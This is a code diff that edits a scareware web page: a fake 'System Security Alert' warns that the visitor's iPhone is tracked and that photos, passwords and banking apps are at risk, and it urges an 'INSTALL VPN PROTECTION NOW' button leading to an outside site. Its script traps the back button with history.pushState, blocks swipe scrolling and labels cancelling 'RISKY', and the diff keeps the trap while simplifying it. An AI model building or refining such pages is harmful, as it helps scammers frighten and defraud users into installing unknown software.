@@ -37,7 +37,7 @@
 
     .alert-box {
       background: #fff;
-      /* Red border removed as requested */
+      border: none; /* ✅ Red border removed */
       border-radius: 18px;
       padding: 25px;
       max-width: 400px;
@@ -115,14 +115,14 @@
   <div class="alert-container" id="alertContainer">
     <div class="alert-box" id="alertBox">
       <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Alert">
-      <h1>System Security Alert </h1>
+      <h1>System Security Alert ⚠️</h1>
       <p><strong>Your iPhone is being tracked!</strong></p>
       <p>Suspicious behavior has been detected from scammers.</p>
       <p>They may access:<br>• Photos<br>• Passwords<br>• Banking apps</p>
 
       <div class="btn-group">
         <button class="btn btn-install" onclick="window.location.href='https://antivirus-browser.netlify.app/'">
-          INSTALL VPN PROTECTION NOW
+          🔒 INSTALL VPN PROTECTION NOW
         </button>
         <button class="btn btn-cancel" id="cancelBtn">
           CANCEL (RISKY)
@@ -139,14 +139,9 @@
     const exitAttemptsText = document.getElementById('exitAttempts');
     const alertBox = document.getElementById('alertBox');
 
-    // Push 10 fake states to aggressively trap back
-    for (let i = 0; i < 10; i++) {
-      history.pushState({}, '', location.href);
-    }
-
-    // Trap back button
+    history.pushState(null, null, location.href);
     window.onpopstate = function () {
-      history.pushState({}, '', location.href);
+      history.pushState(null, null, location.href);
       handleExitAttempt();
     };
 
@@ -167,13 +162,12 @@
         alertBox.style.animation = "shake 0.4s";
         setTimeout(() => alertBox.style.animation = "", 500);
       } else {
-        window.location.href = "about:blank"; // Final exit allowed
+        window.location.href = "about:blank"; // Let them exit
       }
     }
 
     cancelBtn.addEventListener('click', handleExitAttempt);
 
-    // Prevent scroll or swipe exit
     document.addEventListener('touchmove', function (e) {
       e.preventDefault();
     }, { passive: false });
